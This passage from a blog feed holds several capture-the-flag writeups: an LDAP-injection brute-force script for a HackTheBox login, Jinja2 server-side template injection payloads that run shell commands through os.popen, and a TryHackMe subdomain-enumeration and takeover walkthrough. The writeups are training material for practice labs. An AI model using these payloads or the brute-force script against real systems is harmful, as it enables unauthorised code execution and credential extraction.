alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"190\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<blockquote class=\"abq abr abs\">\n<p id=\"de86\" class=\"xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\">This gives us a hint that it is probably using <a class=\"af rn\" href=\"https://searchmobilecomputing.techtarget.com/definition/LDAP\" rel=\"noopener ugc nofollow\" target=\"_blank\">LDAP</a> authentication.</p>\n</blockquote>\n<p id=\"23b0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we are going to try character brute-force (LDAP Injection) using Python script.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"cdc9\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> string<br><br>headers = {<span class=\"hljs-string\">\"UserAgent\"</span> : <span class=\"hljs-string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\"</span>}<br>url = <span class=\"hljs-string\">\"http://167.99.84.37:32125/login\"</span><br><br>chars = string.ascii_letters<br>chars += <span class=\"hljs-string\">''</span>.join([<span class=\"hljs-string\">'0'</span>, <span class=\"hljs-string\">'1'</span>, <span class=\"hljs-string\">'2'</span>, <span class=\"hljs-string\">'3'</span>, <span class=\"hljs-string\">'4'</span>, <span class=\"hljs-string\">'5'</span>, <span class=\"hljs-string\">'6'</span>, <span class=\"hljs-string\">'7'</span>, <span class=\"hljs-string\">'8'</span>, <span class=\"hljs-string\">'9'</span>, <span class=\"hljs-string\">'`'</span>, <span class=\"hljs-string\">'~'</span>, <span class=\"hljs-string\">'!'</span>, <span class=\"hljs-string\">'@'</span>, <span class=\"hljs-string\">'$'</span>, <span class=\"hljs-string\">'%'</span>, <span class=\"hljs-string\">'&amp;'</span>, <span class=\"hljs-string\">'-'</span>, <span class=\"hljs-string\">'_'</span>, <span class=\"hljs-string\">\"'\"</span>])<br><br>counter = <span class=\"hljs-number\">0</span><br>flag = <span class=\"hljs-string\">\"HTB{\"</span><br><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">True</span>:<br>    <span class=\"hljs-comment\"># if all chars are not correct means we previous already found the flag</span><br>    <span class=\"hljs-keyword\">if</span> counter == <span class=\"hljs-built_in\">len</span>(chars):<br>        <span class=\"hljs-built_in\">print</span>(flag + <span class=\"hljs-string\">\"}\"</span>)<br>        <span class=\"hljs-keyword\">break</span><br><br>    <span class=\"hljs-comment\"># creates something like HTB{a*}</span><br>    password = flag + chars[counter] + <span class=\"hljs-string\">\"*}\"</span><br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Trying: \"</span> + password)<br><br>    data = {<span class=\"hljs-string\">\"username\"</span> : <span class=\"hljs-string\">\"Reese\"</span>, <span class=\"hljs-string\">\"password\"</span> : password}<br>    response = requests.post(url, headers=headers, data=data)<br>    <br>    <span class=\"hljs-keyword\">if</span> (response.url != url + <span class=\"hljs-string\">\"?message=Authentication%20failed\"</span>):<br>        <span class=\"hljs-comment\"># possible flag since we still using * at the end: e.g HTB{abc_*}.</span><br>        <span class=\"hljs-comment\"># append chars[] so that we not need to deal with removing \"*}\" as compared to if we assign password variable to flag variable</span><br>        flag += chars[counter]<br>        counter = <span class=\"hljs-number\">0</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-comment\"># increment the char since we might not have found the right letter</span><br>        counter += <span class=\"hljs-number\">1</span></span></pre>\n<p id=\"9132\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Once we iterated all the letters and the result still fails, it means that the latest password/flag entered <strong class=\"ly kz\">without </strong>the asterisk (*) is the flag.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*SqUTjKBmeNorLcV9O6Llmw.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"382\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"4f95\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Hurrah!!! we got the flag that we are seeking :))</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/8/Phonebook-HTB-Web-Challenge-Writeup1.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "HackTheBox",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:49:22+06:00",
            "date_modified": "2024-01-29T16:56:52+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html",
            "title": "Templated — HTB Web Challenge Writeup",
            "summary": "CHALLENGE DESCRIPTION First Start Instance and then you are provided with an web address in the form of &lt;ip&gt;:&lt;port&gt;. Copy it and open it in another tab or&hellip;",
            "content_html": "<p id=\"7abf\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom dropcap\" data-selectable-paragraph=\"\"><span class=\"l aon aoo aop bn aoq aor aos aot aou dj\">C</span>HALLENGE DESCRIPTION</p>\n<h2 id=\"8d9c\" class=\"ze zf tu be zg la zh do ld le zi dq lh li zj lj lm ln zk lo lr ls zl lt lw zm bj\" data-selectable-paragraph=\"\">Can you exploit this simple mistake?</h2>\n<p id=\"e467\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">First Start Instance and then you are provided with an <code class=\"ff abm abn abo abp b\">web address</code> in the form of <code class=\"ff abm abn abo abp b\">&lt;ip&gt;:&lt;port&gt;</code>. Copy it and open it in another tab or browser. In my case it was <a class=\"af rn\" href=\"http://134.209.18.1:30563/\" rel=\"noopener ugc nofollow\" target=\"_blank\">http://134.209.18.1:30563</a></p>\n<p id=\"eea7\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now let’s visit the webpage:</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aov\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*1LXjZNafDz94euePR9ZFnw.png\" alt=\"HTB Web Challenge Templated writeup\" width=\"700\" height=\"300\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"0d94\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">The web app shows a message <code class=\"ff abm abn abo abp b\">Site still under construction</code><br><code class=\"ff abm abn abo abp b\">Proudly powered by Flask/Jinja2</code></p>\n<p id=\"3097\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">There is a hint do you notice? Yeah, you notice… Here the web app technology is Flask/Jinja2. (It is a hint for us.)</p>\n<p id=\"8025\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">If you search for <strong class=\"ly kz\">Flask/Jinja2 exploit</strong> then you can find it has SSTI (Server Side Template Injection)</p>\n<p id=\"b122\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">We can indicate possible SSTI by adding <strong class=\"ly kz\"><em class=\"abt\">{{ 5* 5 }}</em></strong> to the parameter search, we can see that the template engine evaluates the mathematical expression and the application responds with <strong class=\"ly kz\"><em class=\"abt\">25</em></strong>.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aov\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*xko-JwNVbZLFqyi9rFhlTg.png\" alt=\"\" width=\"700\" height=\"300\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<h3 id=\"f449\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\">Now we are going to exploit this using SSTI</h3>\n<p id=\"3fc5\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\">Use the bellow payloads to begin our exploitation to get the flag!</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"0d2a\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">{{request.application.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).<span class=\"hljs-built_in\">popen</span>(<span class=\"hljs-string\">'id'</span>).<span class=\"hljs-built_in\">read</span>()}}</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aov\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*AijyueE1MzBurK9MK3tGhA.png\" alt=\"HTB Web Challenge Templated Writeup\" width=\"700\" height=\"177\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"3709\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">{{request.application.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).<span class=\"hljs-built_in\">popen</span>(<span class=\"hljs-string\">'ls'</span>).<span class=\"hljs-built_in\">read</span>()}}</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aow\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*1Dnd-7JeY7Z2ODWjTWceqA.png\" alt=\"HTB Web Challenge Templated\" width=\"700\" height=\"148\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"52d1\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">{{request.application.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).<span class=\"hljs-built_in\">popen</span>(<span class=\"hljs-string\">'cat flag.txt'</span>).<span class=\"hljs-built_in\">read</span>()}}</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aox\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*pefVP-Tw4pCXwTM85ByqXw.png\" alt=\"\" width=\"700\" height=\"177\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"9bf3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Hurrah!!! We found the flag. This is where our challenge finished :))</p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "HackTheBox",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:47:34+06:00",
            "date_modified": "2024-01-07T10:47:34+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html",
            "title": "TakeOver TryHackMe Writeup",
            "summary": "Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can&hellip;",
            "content_html": "<p id=\"4842\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can takeover.</p>\n<p id=\"e010\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Our website is located at <a class=\"af rn\" href=\"https://futurevera.thm/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://futurevera.thm</a></p>\n<p id=\"649a\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\"><strong>Difficulty =</strong> Easy</p>\n<p id=\"c20c\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Challenges: </strong><span class=\"ly kz\">Sub-Domain Enumeration, Sub-Domain Takeover.</span></p>\n<p id=\"34a2\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">TryHackMe Room Link: <a class=\"af rn\" href=\"https://tryhackme.com/room/takeover\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://tryhackme.com/room/takeover</a></p>\n<p id=\"1425\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">The beginning starts the machine and grub the IP. Then add the $IP in /etc/hosts for futurevera.thm Use the bellow command to do that.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"8522\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sudo <span class=\"hljs-built_in\">echo</span> &lt;THM-IP&gt; futurevera.thm &gt;&gt; /etc/hosts</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aod\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*n44zCgJjwvbYIVVUdsl1xg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"380\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"b88e\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">First, visit the website and let check what’s there…</p>\n<p id=\"9134\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">So, there is nothing interesting. I tried Rustscan to check the open port but found nothing and there is nothing in the source code.</p>\n<p id=\"1a45\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we begin our subdomain enumeration stuff. For that, I’m using the Gobuster tool.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"ff0d\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">gobuster vhost -u futurevera.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aoe\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*4rVn0_XVfST7JccOW3N2Bg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"228\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"2364\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Here we got “<a class=\"af rn\" href=\"http://portal.futurevera.thm/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://portal.futurevera.thm</a>” as a subdomain.</p>\n<p id=\"5814\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Before access add that on /etc/hosts then visit that subdomain.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"f461\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sudo <span class=\"hljs-built_in\">echo</span> &lt;THM-IP&gt; portal.futurevera.thm &gt;&gt; /etc/hosts</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aof\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*lYTeEEwUR38XwA_q-a5DSQ.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"184\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"6a40\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">But we can’t access the site cause it’s a privet or internal subdomain.</p>\n<p id=\"caac\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">If you read the description carefully then you notice that they write blogs and they are rebuilding their support. Umm… There might be <a class=\"af rn\" href=\"https://blog.futurevera.thm/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://blog.futurevera.thm</a> and <a class=\"af rn\" href=\"https://suport.futurevera.thm/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://support.futurevera.thm</a> subdomains.</p>\n<p id=\"117f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">So, let’s check this.</p>\n<p id=\"499d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">A blog….</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aog\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*rBtfCqbxtAvOZquwfK-tlg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"380\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"5576\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">And suport website!!!!</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aog\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*WNlYhbHn-GV1p8U9aQLyMg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"380\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"9479\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Actually, I tried DNS enumeration but didn’t get any record except A record.</p>\n<p id=\"f5f3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">So, I checked all these subdomains' SSL Certificates. In <a class=\"af rn\" href=\"https://suport.futurevera.thm/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://support.futurevera.thm</a> subdomains Certificates there is an alternative DNS record :)</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aog\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*Vyv_P5mEdd-S-S0543o1jg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"380\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"b684\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now add that on /etc/hosts then visit that subdomain.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"fa43\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sudo <span class=\"hljs-built_in\">echo</span> &lt;THM-IP&gt; secrethelpdesk934752.support.futurevera.thm &gt;&gt; /etc/hosts</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aog\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*Xgi-Xx5lhvpSAF_4IhP-nw.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"380\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"58f0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">It actually shows the main website here… What if we remove ‘https//’ and add ‘http://’ before the subdomain? Let's check.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aoh\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*CKfRMokQdBz3wABQhfYfmg.png\" alt=\"TakeOver TryHackMe Writeup\" width=\"700\" height=\"122\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"1f87\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Bang we got our flag….!!!!!!! :)</p>\n<h4 id=\"e233\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\">Actually what happened here and What is a subdomain takeover?</h4>\n<p id=\"6369\" class=\"xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><em><span class=\"tu\">Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.</span></em></p>\n<p id=\"5eca\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong>You can read more about subdomain takeovers here:</strong></p>\n<ul>\n<li id=\"fb78\" class=\"xw xx tu ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp acj ack acl bj\" data-selectable-paragraph=\"\"><a class=\"af rn\" href=\"https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/</a></li>\n<li id=\"ee0b\" class=\"xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj\" data-selectable-paragraph=\"\"><a class=\"af rn\" href=\"https://www.hackerone.com/blog/Guide-Subdomain-Takeovers\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://www.hackerone.com/blog/Guide-Subdomain-Takeovers</a></li>\n<li id=\"2076\" class=\"xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj\" data-selectable-paragraph=\"\"><a class=\"af rn\" href=\"https://0xpatrik.com/subdomain-takeover-ns/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://0xpatrik.com/subdomain-takeover-ns/</a></li>\n</ul>\n<p id=\"d210\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Thanks for Reading!!</strong></p>\n<p id=\"caaa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Follow me on Twitter</strong>: <a class=\"af rn\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"a415\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Happy Takeover ~</strong></p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/6/TakeOver-TryHackMe-Writeup.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "TryHackMe",
                   "Subdomain Recon",
                   "Pentesting",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:44:15+06:00",
            "date_modified": "2024-01-07T10:44:15+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html",
            "title": "Bugged Tryhackme CTF Writeup",
            "summary": "John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;",
